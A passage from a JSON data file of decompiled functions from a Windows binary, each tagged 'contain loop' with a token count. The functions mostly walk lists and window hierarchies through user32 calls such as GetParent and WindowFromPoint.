        "decompiled_code": "\nvoid __fastcall fcn.0041c6e4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((param_2 < 0) || (0x7ffffff < param_2)) {\n        fcn.0041c444();\n    }\n    if (*(in_EAX + 0xc) < param_2) {\n        fcn.0041c6a8();\n    }\n    if (*(in_EAX + 8) < param_2) {\n        fcn.004031a8();\n    }\n    else {\n        iVar1 = *(in_EAX + 8) + -1;\n        iVar2 = param_2 - iVar1;\n        if (iVar2 == 0 || param_2 < iVar1) {\n            iVar2 = iVar2 + -1;\n            do {\n                fcn.0041c3a4();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 != 0);\n        }\n    }\n    *(in_EAX + 8) = param_2;\n    return;\n}\n",
        "token_count": 252
    },
    "0041cd44": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041cd44(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    fcn.00406298();\n    if (in_EAX != NULL) {\n        iVar2 = fcn.00403a28();\n        if (iVar2 == 0) {\n            cVar1 = fcn.004039b8();\n            if ((cVar1 != '\\0') && ((*(in_EAX + 7) & 0x10) != 0)) {\n                fcn.00406298();\n                (**(*in_EAX + 0x28))();\n            }\n        }\n        else {\n            cVar1 = fcn.004039b8();\n            if ((cVar1 == '\\0') || ((*(in_EAX + 7) & 0x10) != 0)) {\n                fcn.00406298();\n                fcn.0041cd44();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 257
    },
    "0041d0e4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041d0e4(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x41d0fd;\n    cVar1 = fcn.004039b8();\n    if (cVar1 == '\\0') {\n        puStack24 = 0x41d173;\n        fcn.0041cae8();\n        return;\n    }\n    puStack24 = 0x41d109;\n    (**(*in_EAX + 0x20))();\n    uStack28 = 0x41d162;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.0041d190();\n    iVar2 = fcn.0041d234();\n    if (-1 < iVar2 + -1) {\n        do {\n            uVar3 = fcn.0041d23c();\n            piVar4 = fcn.0041d0c4(uVar3);\n            (**(*piVar4 + 8))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41d173;\n    uStack28 = 0x41d161;\n    (**(*in_EAX + 0x24))();\n    return;\n}\n",
        "token_count": 371
    },
    "0041feac": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041feac(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar1 = *(*(in_EAX + 0x30) + 8);\n        if (-1 < iVar1 + -1) {\n            do {\n                fcn.0041c4c8();\n                fcn.00403820();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.00403820();\n        *(in_EAX + 0x30) = 0;\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "0042017c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042017c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040583c();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.0041c358();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "004229dc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004229dc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(in_EAX + 0x1c) & 8) == 0) {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 8;\n        if ((*(in_EAX + 0x10) != 0) && (iVar1 = *(*(in_EAX + 0x10) + 8),  -1 < iVar1 + -1)) {\n            do {\n                fcn.0041c4c8();\n                fcn.004229dc();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "0042315c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042315c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if ((arg_8h != in_EAX[0x10]) || (arg_ch != in_EAX[0x11])) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.0041c4c8(arg_8h, arg_ch);\n                (**(*piVar1 + 0x10))();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        in_EAX[0x10] = arg_8h;\n        in_EAX[0x11] = arg_ch;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 218
    },
    "004231d8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004231d8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0x50) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.0041c4c8();\n            if (param_2 == iVar1) {\n                *(param_2 + 0x10) = 0;\n                fcn.0041c3a4();\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "00423748": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00423748(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = 0x423758;\n    iVar1 = fcn.0041c8b0();\n    uStack24 = 0x42379d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar1 = *(iVar1 + 8);\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.0041c4c8();\n            fcn.00403820();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4237a4;\n    uStack24 = 0x42379c;\n    fcn.0041c914();\n    return;\n}\n",
        "token_count": 231
    },
    "0042e998": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0042e998(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0x10) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.0042d8b8();\n            (**(**(iVar1 + 4) + 0x28))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "0043aaa8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0043aaa8(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    *param_1 = 0;\n    bVar2 = false;\n    while( true ) {\n        if (*(in_EAX + 8) <= *param_1) {\n            return bVar2;\n        }\n        iVar1 = fcn.0041c4c8();\n        bVar2 = param_2 == *(iVar1 + 4);\n        if (bVar2) break;\n        *param_1 = *param_1 + 1;\n    }\n    return bVar2;\n}\n",
        "token_count": 158
    },
    "0043aae0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043aae0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = fcn.0044407c();\n    iVar2 = iVar3;\n    while (iVar1 = iVar3,  iVar1 != 0) {\n        iVar3 = sub.user32.dll_GetParent();\n        iVar2 = iVar1;\n    }\n    return iVar2;\n}\n",
        "token_count": 105
    },
    "0043ab9c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0043ab9c(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iStackY20;\n    \n    iVar5 = 0;\n    if (*(in_EAX + 8) != 0) {\n        if (*(in_EAX + 8) == 1) {\n            iStackY20 = 0x43abb7;\n            piVar2 = fcn.0041c4c8();\n            iVar5 = *piVar2;\n        }\n        else {\n            iStackY20 = sub.user32.dll_GetDesktopWindow(param_1);\n            iVar3 = sub.user32.dll_GetTopWindow();\n            while ((iVar4 = iVar3,  iVar5 == 0 && (iVar4 != 0))) {\n                cVar1 = fcn.0043aaa8();\n                if (cVar1 == '\\0') {\n                    iVar3 = sub.user32.dll_GetWindow();\n                    iStackY20 = iVar4;\n                }\n                else {\n                    iVar5 = **(*(in_EAX + 4) + iStackY20 * 4);\n                    iVar3 = iVar4;\n                }\n            }\n        }\n    }\n    return CONCAT44(iStackY20, iVar5);\n}\n",
        "token_count": 303
    },
    "0043b5f8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0043b5f8(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = sub.user32.dll_WindowFromPoint(*in_EAX, in_EAX[1]);\n    while ((iVar2 != 0 && (cVar1 = fcn.0043b598(),  cVar1 == '\\0'))) {\n        iVar2 = sub.user32.dll_GetParent();\n    }\n    return iVar2;\n}\n",
        "token_count": 109
    },
    "0043c0c0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0043c0c0(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = sub.user32.dll_WindowFromPoint(*in_EAX, in_EAX[1]);\n    iVar2 = 0;\n    while ((iVar1 != 0 && (iVar2 = fcn.0043a70c(),  iVar2 == 0))) {\n        iVar1 = sub.user32.dll_GetParent();\n    }\n    return iVar2;\n}\n",
        "token_count": 116
    },
    "0043d3b8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0043d3b8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        do {\n            cVar1 = fcn.004039b8();\n            if (cVar1 != '\\0') {\n                fcn.004585b4();\n            }\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "00440b20": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00440b20(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    for (; (param_2 != 0 && (in_EAX != param_2)); param_2 = *(param_2 + 0x30)) {\n    }\n    return in_EAX & 0xffffff00 | param_2 != 0;\n}\n",
        "token_count": 91
    },
    "0044149c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0044149c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.0041c52c();\n    iVar2 = *(*(in_EAX + 0x19c) + 8) + -1;\n    if (iVar1 + 1 <= iVar2) {\n        iVar1 = (iVar2 - (iVar1 + 1)) + 1;\n        do {\n            iVar2 = fcn.0041c4c8();\n            if (*(iVar2 + 0x180) != 0) {\n                return *(iVar2 + 0x180);\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 180
    },
    "00443e90": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00443e90(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    do {\n        iVar1 = in_EAX;\n        in_EAX = *(iVar1 + 0x30);\n    } while (in_EAX != 0);\n    iVar1 = *(iVar1 + 400);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0044407c();\n    }\n    return iVar1;\n}\n",
        "token_count": 107
    },
    "00445e3c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00445e3c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        if (in_EAX == 0) {\n            return 0;\n        }\n        cVar1 = fcn.00445ed8();\n        if (cVar1 != '\\0') break;\n        in_EAX = *(in_EAX + 0xc);\n    }\n    return in_EAX;\n}\n",
        "token_count": 102
    },
    "00445ea0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00445ea0(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    for (iVar1 = *(in_EAX + 8); iVar1 != 0; iVar1 = *(iVar1 + 0xc)) {\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 94
    },
    "00445eb4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00445eb4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    iVar1 = fcn.004464f4();\n    while (iVar1 != 0) {\n        iVar1 = fcn.004464cc();\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 87
    },
    "00445ed8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar fcn.00445ed8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar uVar3;\n    \n    if (*(in_EAX + 4) == 0) {\n        for (iVar2 = fcn.004464f4(); iVar2 != 0; iVar2 = *(iVar2 + 0xc)) {\n            cVar1 = fcn.00445ed8();\n            if (cVar1 != '\\0') {\n                return 1;\n            }\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = *(*(in_EAX + 4) + 0x57);\n    }\n    return uVar3;\n}\n",
        "token_count": 162
    },
    "00446248": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00446248(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *(*(arg_8h + -4) + 0x14);\n    while( true ) {\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar2 = fcn.004464cc();\n        if (iVar2 != 0) break;\n        iVar1 = *(iVar1 + 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 120
    },
    "0044641c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0044641c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *(in_EAX + 8);\n    do {\n        iVar1 = *(iVar1 + 0xc);\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 69
    },
    "0044642c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0044642c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    fcn.00446418();\n    for (iVar1 = *(in_EAX + 8); iVar1 != 0; iVar1 = *(iVar1 + 0xc)) {\n        iVar2 = fcn.00445ea0();\n        if (0 < iVar2) {\n            fcn.0044641c();\n            fcn.0044642c();\n        }\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "0044646c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0044646c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = *(in_EAX + 8);\n    do {\n        if (iVar1 == 0) {\n            return;\n        }\n        iVar2 = fcn.004463f0();\n        iVar3 = fcn.00445f0c();\n        if (iVar2 < iVar3) {\ncode_r0x004464a0:\n            fcn.004460d8();\n            fcn.004467a8(0x447fa0, *(in_EAX + 0x1c));\n        }\n        else {\n            iVar2 = fcn.004463f0();\n            iVar3 = fcn.00445f54();\n            if (iVar3 < iVar2) goto code_r0x004464a0;\n        }\n        fcn.0044646c();\n        iVar1 = *(iVar1 + 0xc);\n    } while( true );\n}\n",
        "token_count": 229
    },
    "004464d8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004464d8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(in_EAX + 0x18);\n    while( true ) {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        cVar1 = fcn.00445ed8();\n        if (cVar1 != '\\0') break;\n        iVar2 = *(iVar2 + 0x18);\n    }\n    return iVar2;\n}\n",
        "token_count": 119
    },
    "0044676c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044676c(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    (**(arg_8h + 8))();\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0044676c(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.0044676c(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "004476c4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004476c4(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xc) != 0) {\n        fcn.004476c4(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.004476c4(arg_8h);\n    }\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 100
    },
    "00447da0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447da0(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (in_EAX != 0) {\n        iVar2 = fcn.004464cc();\n        if ((iVar2 == 0) && (in_EAX != *(*(arg_8h + -4) + 100))) {\n            cVar1 = fcn.00445ed8();\n            if (cVar1 != '\\0') {\n                if (*(*(arg_8h + -4) + 100) == *(in_EAX + 0x14)) {\n                    fcn.00446418();\n                }\n                else {\n                    fcn.004463f0();\n                    fcn.00446418();\n                }\n            }\n        }\n        iVar2 = arg_8h;\n        fcn.004464f4();\n        fcn.00447da0(iVar2);\n        fcn.004464cc();\n        fcn.00447da0(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 239
    },
    "004481f8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004481f8(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    cVar1 = fcn.00445e58();\n    if (cVar1 == '\\0') {\n        *(in_EAX + 0x24) = 0;\n    }\n    else {\n        iVar2 = fcn.00445f0c();\n        *(in_EAX + 0x24) = *(in_EAX + 0x20) - iVar2;\n    }\n    if (*(in_EAX + 0x14) != 0) {\n        cVar1 = fcn.00445ed8();\n        if (cVar1 == '\\0') {\n            fcn.004481f8(arg_8h);\n        }\n    }\n    iVar2 = fcn.004464d8();\n    if (iVar2 != 0) {\n        fcn.004464d8();\n        fcn.0044642c();\n    }\n    fcn.004467a8(0x447fa0, *(arg_8h + -4));\n    return;\n}\n",
        "token_count": 255
    },
    "00449de8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449de8(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar in_ZF;\n    \n    fcn.004049d4(param_2);\n    if (!in_ZF) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.004039dc();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x4c))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.0040461c();\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "0044a0e8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a0e8(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != in_EAX[0x20]) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.004039dc();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x6c))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        in_EAX[0x20] = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "0044a144": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a144(uint param_1, int16_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != *(in_EAX + 0x21)) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.004039dc();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x70))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *(in_EAX + 0x21) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "0044a1a8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a1a8(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (param_2 != *(in_EAX + 0x86)) {\n        iVar3 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                iVar1 = fcn.004039dc();\n                if (iVar1 != 0) {\n                    piVar2 = fcn.0041c4c8();\n                    (**(*piVar2 + 0x74))();\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        *(in_EAX + 0x86) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 215
    },
    "0044a33c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0044a33c(uint param_1, int16_t param_2)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack20;\n    \n    iStack20 = -1;\n    iVar3 = (**(*in_EAX + 0x14))();\n    iVar1 = iStack20;\n    if (-1 < iVar3 + -1) {\n        iVar4 = 0;\n        do {\n            iVar2 = (**(*in_EAX + 0x18))();\n            iVar1 = iVar4;\n            if (param_2 == iVar2) break;\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n            iVar1 = iStack20;\n        } while (iVar3 != 0);\n    }\n    iStack20 = iVar1;\n    return CONCAT44(iStack20, iStack20);\n}\n",
        "token_count": 221
    },
    "0044b1ac": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044b1ac(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 0x4c) != 0) && (iVar2 = *(*(in_EAX + 0x4c) + 8),  -1 < iVar2 + -1)) {\n        do {\n            iVar1 = fcn.0041c4c8();\n            if (param_2 == iVar1) {\n                *(param_2 + 4) = 0;\n                fcn.0041c3a4();\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "0044d948": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044d948(uint8_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.0044f454();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            if (iVar3 < param_2) {\n                iVar2 = fcn.0044f464();\n                if (param_1 < *(iVar2 + 0x3f)) {\n                    fcn.0044ca50();\n                }\n            }\n            else {\n                iVar2 = fcn.0044f464();\n                if (*(iVar2 + 0x3f) <= param_1 && param_1 != *(iVar2 + 0x3f)) {\n                    iVar2 = fcn.0044f464();\n                    *(iVar2 + 0x3f) = param_1;\n                }\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 251
    },
    "0044f51c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044f51c(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0044f454();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.0044f464();\n            (*arg_8h)();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "0044f97c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0044f97c(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.0044f454();\n    if (-1 < iVar1 + -1) {\n        do {\n            piVar2 = fcn.0044f464();\n            (**(*piVar2 + 0x40))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "0044fa10": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0044fa10(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    do {\n        iVar1 = in_EAX;\n        in_EAX = *(iVar1 + 100);\n    } while (in_EAX != 0);\n    return *(iVar1 + 0x70);\n}\n",
        "token_count": 74
    },
    "00450a40": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450a40(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    for (; (0 < param_2 && (in_EAX != 0)); in_EAX = *(in_EAX + 100)) {\n        param_2 = param_2 + -1;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00451e2c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451e2c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            piVar1 = fcn.0041c4c8();\n            if (param_2 == *piVar1) {\n                puVar2 = fcn.0041c4c8();\n                *puVar2 = 0;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 169
    },
    "004544bc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004544bc(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    do {\n        iVar2 = in_EAX;\n        in_EAX = *(iVar2 + 0x30);\n    } while (in_EAX != 0);\n    cVar1 = fcn.004039b8();\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 108
    },
    "004572c4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.004572c4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uStack28;\n    \n    uStack28 = fcn.0044407c(2, 0);\n    iVar1 = (***0x484558)();\n    iVar2 = fcn.0045ad3c();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.0045ad28();\n            if (iVar1 == *(iVar3 + 4)) {\n                uStack28 = fcn.0045ad28();\n                goto code_r0x004573a2;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar2 = fcn.0045ad3c();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.0041c4c8();\n            fcn.00403820();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    (**(**(*0x485b4c + 0x58) + 8))();\n    (***0x4845b0)(0, 0, fcn.00457294, *(*0x485b4c + 0x58));\n    iVar2 = fcn.0045ad3c();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.0045ad28();\n            if (iVar1 == *(iVar3 + 4)) {\n                uStack28 = fcn.0045ad28();\n                break;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\ncode_r0x004573a2:\n    return CONCAT44(uStack28, uStack28);\n}\n",
        "token_count": 412
    },
    "004586ac": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004586ac(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (param_2 != 0) {\n        do {\n            iVar3 = param_2;\n            param_2 = *(iVar3 + 0x30);\n            if (param_2 == 0) break;\n            cVar1 = fcn.004039b8();\n        } while (cVar1 == '\\0');\n        if ((iVar3 != 0) && (param_1 != iVar3)) {\n            uVar2 = fcn.0044407c();\n            sub.user32.dll_SendMessageA(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 169
    },
    "0045a330": {
        "rules": [
            "contain loop"
        ],
